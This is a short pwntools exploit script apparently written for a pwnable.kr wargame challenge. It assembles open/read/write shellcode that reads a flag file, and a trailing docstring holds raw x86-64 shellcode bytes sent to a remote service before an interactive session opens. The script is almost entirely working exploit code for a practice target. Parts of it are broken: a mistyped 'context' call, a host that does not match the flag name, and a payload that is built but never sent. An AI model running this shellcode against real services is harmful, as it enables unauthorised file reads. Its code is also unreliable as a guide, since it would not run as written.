#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

#

host , port = 'chall.pwnable.tw' , 10104
y = remote( host , port )

conrext.arch( 'amd64' )


p = asm(shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'))
p += asm(shellcraft.open('rsp',0,0))
p += asm(shellcraft.read('rax','rsp',0x70))
p += asm(shellcraft.write(1,'rsp',0x70))

print 

'''
On Pwnable.kr server:

from pwn import *

host = '127.0.0.1'
port = 9026

y = remote(host,port)
p = 'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8n1n1nof\x01H1\x04$H\xb8o0o0o0o0PH\xb800000000PH\xb8oooo0000PH\xb8ooooooooPH\xb8ooooooooPH\xb800000oooPH\xb800000000PH\xb800000000PH\xb8oooo0000PH\xb8ooooooooPH\xb8ooooooooPH\xb8ooooooooPH\xb8ooooooooPH\xb8ooooooooPH\xb8ooooooooPH\xb8ooooooooPH\xb8ooooooooPH\xb8ooooooooPH\xb8s_very_lPH\xb8e_name_iPH\xb8_the_filPH\xb8le.sorryPH\xb8_this_fiPH\xb8ase_readPH\xb8file_plePH\xb8kr_flag_PH\xb8pwnable.PH\xb8this_is_Pj\x02XH\x89\xe71\xf6\x99\x0f\x05H\x89\xc71\xc0jpZH\x89\xe6\x0f\x05j\x01Xj\x01_jpZH\x89\xe6\x0f\x05'

p2 = '1\xc01\xffj0Z\xbe\x01\x01\x01\x01\x81\xf6\xa1!!\x01\x0f\x05j\x01Xj\x01_j0Z\xbe\x01\x01\x01\x01\x81\xf6\xa1!!\x01\x0f\x05'

p3 = '1\xc01\xffj0Z\xbe\x01\x01\x01\x01\x81\xf6\xa1!!\x01\x0f\x05'

sleep(0.5)
y.sendline( p )
print 'sent!!'

y.interactive()
'''